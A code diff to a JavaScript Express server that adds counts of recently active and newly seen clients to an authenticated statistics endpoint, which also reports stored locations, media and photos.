@@ -841,14 +841,19 @@ app.get('/api/search', requireAuth, (req, res) => {
 });
 
 app.get('/api/stats', requireAuth, (req, res) => {
-    const cutoff = Date.now() - 20000;
+    const cutoff20s = Date.now() - 20000;
+    const cutoff5m  = Date.now() - 300000;
+    const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
     Object.entries(store.clients).forEach(([id, c]) => {
-        if (new Date(c.lastSeen).getTime() < cutoff) c.online = false;
+        if (new Date(c.lastSeen).getTime() < cutoff20s) c.online = false;
     });
+    const clientVals = Object.values(store.clients);
     res.json({
         clients: store.clients,
-        clientCount: Object.keys(store.clients).length,
-        onlineCount: Object.values(store.clients).filter(c => c.online).length,
+        clientCount: clientVals.length,
+        onlineCount: clientVals.filter(c => c.online).length,
+        active5mCount: clientVals.filter(c => new Date(c.lastSeen).getTime() >= cutoff5m).length,
+        newTodayCount: clientVals.filter(c => new Date(c.firstSeen).getTime() >= todayStart.getTime()).length,
         locationCount: store.locations.length,
         mediaCount: store.media.length,
         photoCount: store.photos.length,
